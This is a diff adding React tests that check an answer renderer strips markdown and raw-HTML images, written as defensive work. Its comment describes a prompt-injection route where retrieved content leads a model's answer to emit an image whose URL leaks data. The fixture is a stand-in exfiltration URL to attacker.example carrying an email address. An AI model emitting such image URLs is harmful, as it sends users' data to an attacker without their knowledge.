@@ -1,5 +1,6 @@
+import { render, screen } from "@testing-library/react";
 import { describe, expect, it } from "vitest";
-import { stripCiteMarkers } from "./markdown";
+import { AnswerMarkdown, stripCiteMarkers } from "./markdown";
 
 const UUID = "3174bc60-028e-4df2-82c7-d9b3a4eb1b11";
 
@@ -60,5 +61,49 @@ describe("stripCiteMarkers — several ids in one bracket", () => {
     expect(stripCiteMarkers("See [c: the note below] for detail.")).toBe(
       "See [c: the note below] for detail."
     );
+  });
+});
+
+describe("AnswerMarkdown images", () => {
+  /** Retrieved content sits in the system prompt, so an answer can be talked
+   *  into emitting an image whose URL carries the data it was shown. A remote
+   *  <img> is a GET the reader never clicks. */
+  const exfil = "https://attacker.example/log?c=alice%40example.com";
+
+  it("drops a markdown image", () => {
+    const { container } = render(<AnswerMarkdown content={`Here you go.
+
+![](${exfil})`} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("attacker.example");
+    expect(screen.getByText("Here you go.")).toBeInTheDocument();
+  });
+
+  it("drops an image nested in a link, a list and a table cell", () => {
+    const content = `[![alt](${exfil})](https://example.com)
+
+- ![alt](${exfil})
+
+| a |
+| --- |
+| ![alt](${exfil}) |`;
+    const { container } = render(<AnswerMarkdown content={content} />);
+    expect(container.querySelectorAll("img")).toHaveLength(0);
+    expect(container.innerHTML).not.toContain("attacker.example");
+  });
+
+  it("escapes a raw <img> tag rather than rendering it", () => {
+    // Raw HTML is already inert without rehype-raw — the tag lands as visible
+    // text, so nothing is fetched. This pins that it stays so.
+    const { container } = render(<AnswerMarkdown content={`<img src="${exfil}">`} />);
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).toContain("&lt;img");
+  });
+
+  it("still renders ordinary links", () => {
+    const { container } = render(<AnswerMarkdown content="See [the guide](https://example.com)." />);
+    const link = container.querySelector("a");
+    expect(link).toHaveAttribute("href", "https://example.com");
+    expect(link).toHaveAttribute("rel", "noreferrer noopener");
   });
 });
